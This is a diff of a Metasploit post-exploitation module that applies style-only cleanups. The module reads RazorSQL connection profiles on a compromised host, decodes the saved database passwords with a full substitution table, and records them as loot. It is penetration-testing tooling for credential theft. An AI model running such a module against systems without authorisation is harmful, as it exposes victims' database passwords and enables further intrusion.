@@ -66,7 +66,7 @@ class MetasploitModule < Msf::Post
 
     credential_data = {
       module_fullname: fullname,
-      post_reference_name: self.refname,
+      post_reference_name: refname,
       session_id: session_db_id,
       origin_type: :session,
       private_data: opts[:password],
@@ -76,14 +76,14 @@ class MetasploitModule < Msf::Post
 
     login_data = {
       core: create_credential(credential_data),
-      status: Metasploit::Model::Login::Status::UNTRIED,
+      status: Metasploit::Model::Login::Status::UNTRIED
     }.merge(service_data)
 
     create_credential_login(login_data)
   end
 
   def run
-    print_status("Checking All Users...")
+    print_status('Checking All Users...')
     creds_tbl = Rex::Text::Table.new(
       'Header' => 'RazorSQL User Credentials',
       'Indent' => 1,
@@ -109,7 +109,7 @@ class MetasploitModule < Msf::Post
     end
 
     if creds_tbl.rows.empty?
-      print_status("No creds collected.")
+      print_status('No creds collected.')
     else
       path = store_loot(
         'razor.user.creds',
@@ -125,18 +125,20 @@ class MetasploitModule < Msf::Post
   end
 
   def get_content(file)
-    found = session.fs.file.stat(file) rescue nil
-    return if not found
+    found = begin
+      session.fs.file.stat(file)
+    rescue StandardError
+      nil
+    end
+    return if !found
 
     content = ''
-    infile = session.fs.file.new(file, "rb")
-    until infile.eof?
-      content << infile.read
-    end
+    infile = session.fs.file.new(file, 'rb')
+    content << infile.read until infile.eof?
     return content
   end
 
-  def parse_content(table, content)
+  def parse_content(_table, content)
     creds = []
     content = content.split(/\(\(Z~\]/)
     content.each do |db|
@@ -151,13 +153,13 @@ class MetasploitModule < Msf::Post
       # Decrypt if there's a password
       unless pass.blank?
         if pass =~ /\{\{\{VFW(.*)!\^\*#\$RIG/
-          decrypted_pass = decrypt_v2($1)
+          decrypted_pass = decrypt_v2(::Regexp.last_match(1))
         else
           decrypted_pass = decrypt(pass)
         end
       end
 
-      pass = decrypted_pass ? decrypted_pass : pass
+      pass = decrypted_pass || pass
 
       # Store data
       creds << [user, pass, type, host, port, dbname, database]
@@ -179,24 +181,24 @@ class MetasploitModule < Msf::Post
 
   def decrypt(encrypted_password)
     magic_key = {
-      "/" => "a", "<" => "b", ">" => "c", ":" => "d", "X" => "e",
-      "c" => "f", "W" => "g", "d" => "h", "V" => "i", "e" => "j",
-      "f" => "k", "g" => "l", "U" => "m", "T" => "n", "S" => "o",
-      "n" => "p", "m" => "q", "l" => "r", "k" => "s", "j" => "t",
-      "i" => "u", "h" => "v", "P" => "w", "Q" => "x", "R" => "y",
-      "o" => "z", "p" => "A", "q" => "B", "r" => "C", "t" => "D",
-      "s" => "E", "L" => "F", "M" => "H", "O" => "I", "N" => "J",
-      "J" => "K", "v" => "L", "u" => "M", "z" => "N", "y" => "O",
-      "w" => "P", "x" => "Q", "G" => "R", "H" => "S", "A" => "T",
-      "B" => "U", "D" => "V", "C" => "W", "E" => "X", "F" => "Y",
-      "I" => "Z", "?" => "1", "3" => "2", "4" => "3", "5" => "4",
-      "6" => "5", "7" => "6", "8" => "7", "9" => "8", "2" => "9",
-      "." => "0", "+" => "+", "\"" => "\"", "*" => "*", "%" => "%",
-      "&" => "&", "Z" => "/", "(" => "(", ")" => ")", "=" => "=",
-      "," => "?", "!" => "!", "$" => "$", "-" => "-", "_" => "_",
-      "b" => ":", "0" => ".", ";" => ";", "1" => ",", "\\" => "\\",
-      "a" => "<", "Y" => ">", "'" => "'", "^" => "^", "{" => "{",
-      "}" => "}", "[" => "[", "]" => "]", "~" => "~", "`" => "`"
+      '/' => 'a', '<' => 'b', '>' => 'c', ':' => 'd', 'X' => 'e',
+      'c' => 'f', 'W' => 'g', 'd' => 'h', 'V' => 'i', 'e' => 'j',
+      'f' => 'k', 'g' => 'l', 'U' => 'm', 'T' => 'n', 'S' => 'o',
+      'n' => 'p', 'm' => 'q', 'l' => 'r', 'k' => 's', 'j' => 't',
+      'i' => 'u', 'h' => 'v', 'P' => 'w', 'Q' => 'x', 'R' => 'y',
+      'o' => 'z', 'p' => 'A', 'q' => 'B', 'r' => 'C', 't' => 'D',
+      's' => 'E', 'L' => 'F', 'M' => 'H', 'O' => 'I', 'N' => 'J',
+      'J' => 'K', 'v' => 'L', 'u' => 'M', 'z' => 'N', 'y' => 'O',
+      'w' => 'P', 'x' => 'Q', 'G' => 'R', 'H' => 'S', 'A' => 'T',
+      'B' => 'U', 'D' => 'V', 'C' => 'W', 'E' => 'X', 'F' => 'Y',
+      'I' => 'Z', '?' => '1', '3' => '2', '4' => '3', '5' => '4',
+      '6' => '5', '7' => '6', '8' => '7', '9' => '8', '2' => '9',
+      '.' => '0', '+' => '+', '"' => '"', '*' => '*', '%' => '%',
+      '&' => '&', 'Z' => '/', '(' => '(', ')' => ')', '=' => '=',
+      ',' => '?', '!' => '!', '$' => '$', '-' => '-', '_' => '_',
+      'b' => ':', '0' => '.', ';' => ';', '1' => ',', '\\' => '\\',
+      'a' => '<', 'Y' => '>', "'" => "'", '^' => '^', '{' => '{',
+      '}' => '}', '[' => '[', ']' => ']', '~' => '~', '`' => '`'
     }
     password = ''
     for letter in encrypted_password.chomp.each_char
